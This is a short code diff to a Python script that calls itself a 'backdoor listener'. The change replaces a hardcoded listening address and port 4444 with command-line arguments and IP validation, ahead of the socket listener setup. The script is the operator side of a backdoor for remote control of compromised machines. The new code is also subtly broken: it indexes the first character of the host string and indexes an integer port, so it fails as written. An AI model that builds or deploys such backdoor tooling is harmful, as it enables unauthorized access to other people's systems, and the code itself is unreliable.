@@ -1,8 +1,18 @@
+import ipaddress
 import socket as sc
+import argparse
 
-# Modify this
-port = 4444
-host = "10.0.0.13"
+p = argparse.ArgumentParser(description="Python backdoor listener !")
+p.add_argument("--host", help="Host's IP Address to listen with", required=True, type=str)
+p.add_argument("--port", help="Port to listen on", required=True, type=int)
+args = p.parse_args()
+try:
+    host = args.host[0]
+    port = args.port[0]
+    if ipaddress.IPv4Address(host):
+        pass
+except ipaddress.AddressValueError:
+    print("Wrong ip address was given, please try again.")
 
 # Creating a Listener
 server = sc.socket()
